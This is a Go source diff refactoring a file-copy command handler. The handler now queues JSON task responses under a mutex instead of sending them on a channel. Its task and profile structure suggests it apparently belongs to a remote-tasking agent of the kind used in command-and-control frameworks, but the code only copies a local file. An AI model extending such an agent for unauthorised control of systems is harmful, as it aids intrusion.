@@ -5,9 +5,13 @@ import (
 	"fmt"
 	"io"
 	"os"
+	"sync"
+	"pkg/profiles"
 
 	"pkg/utils/structs"
 )
+
+var mu sync.Mutex
 
 type Arguments struct {
 	Source      string `json:"source"`
@@ -39,30 +43,45 @@ func copy(src, dst string) (int64, error) {
 	return nBytes, err
 }
 
-//Run - Function that executes the shell command
-func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
-	tMsg := structs.ThreadMsg{}
-	tMsg.TaskItem = task
+//Run - Function that executes the copy command
+func Run(task structs.Task) {
+	msg := structs.Response{}
+	msg.TaskID = task.TaskID
 	args := &Arguments{}
 	err := json.Unmarshal([]byte(task.Params), args)
 	if err != nil {
-		tMsg.TaskResult = []byte(err.Error())
-		tMsg.Error = true
-		threadChannel <- tMsg
+		
+		msg.UserOutput = err.Error()
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
 
 	copiedBytes, err := copy(args.Source, args.Destination)
 
 	if err != nil {
-		tMsg.TaskResult = []byte(err.Error())
-		tMsg.Error = true
-		threadChannel <- tMsg
+		
+		msg.UserOutput = err.Error()
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
 
-	tMsg.TaskResult = []byte(fmt.Sprintf("Copied %d bytes to %s", copiedBytes, args.Destination))
-	tMsg.Error = false
-	tMsg.Completed = true
-	threadChannel <- tMsg
+	msg.Completed = true
+	msg.UserOutput = fmt.Sprintf("Copied %d bytes to %s", copiedBytes, args.Destination)
+	resp, _ := json.Marshal(msg)
+	mu.Lock()
+	profiles.TaskResponses = append(profiles.TaskResponses, resp)
+	mu.Unlock()
+	return
 }
